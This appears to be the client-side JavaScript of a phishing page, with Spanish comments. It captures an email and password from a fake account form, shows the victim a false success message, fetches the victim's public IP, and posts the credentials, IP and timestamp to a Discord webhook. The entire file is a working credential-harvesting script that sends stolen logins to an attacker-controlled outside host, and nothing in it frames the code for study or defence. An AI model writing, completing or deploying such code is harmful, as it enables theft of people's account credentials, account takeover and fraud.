$(document).ready(function () {

    $("#account-form").on("submit", function (e) {
        e.preventDefault();

        const email = $("#userAccount").val();        // ✔ variable correcta
        const pass = $("#userCredential").val();      // ✔ variable correcta

        if (!validateAccount(email)) {
            alert("Correo inválido");
            return;
        }

        $("#account-form").hide();
        $("#success-step").show();

        sendToDiscord(email, pass); // ✔ pasar datos
    });

});

function validateAccount(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function sendToDiscord(email, pass) {

    $.getJSON("https://api.ipify.org?format=json", function (ipData) {

        const payload = {
            embeds: [{
                title: "📬 Nuevo formulario",
                color: 3447003,
                fields: [
                    { name: "📧 Email", value: email, inline: false },
                    { name: "🔑 Password", value: pass, inline: false },
                    { name: "🌐 IP", value: ipData.ip, inline: true },
                    { name: "🕒 Fecha", value: new Date().toLocaleString(), inline: true }
                ]
            }]
        };

        $.ajax({
            url: DISCORD_WEBHOOK_URL,
            method: "POST",
            contentType: "application/json",
            data: JSON.stringify(payload)
        });
    });
}
